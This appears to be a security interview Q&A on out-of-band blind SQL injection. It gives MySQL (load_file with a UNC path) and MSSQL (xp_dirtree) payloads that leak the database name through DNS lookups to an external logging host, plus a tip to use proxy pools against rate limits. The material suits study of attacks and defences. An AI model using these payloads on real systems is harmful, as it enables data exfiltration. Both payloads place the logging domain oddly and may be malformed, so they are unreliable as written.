# 22. When SQL injection yields no visible output, how can DNSLog be utilised, and what constructs can be used under MySQL and MSSQL respectively?

## General Approach
- Write a script for automated injection; adjust request frequency or use proxy pools.
- DNSLog injection: place the server’s result in a domain name and read the DNS resolution logs.

## MySQL
Use `load_file()`:
```
' and if((select load_file(concat('\\\\',(select database()),'.\\abc'))),1,0)#xxx.ceye.io
```

## MSSQL
Use `master..xp_dirtree`:
```
DECLARE @host varchar(1024);SELECT @host=db_name()+'. ';EXEC('master..xp_dirtree "\\'+@host+'\foobar$"');xxx.ceye.io
```
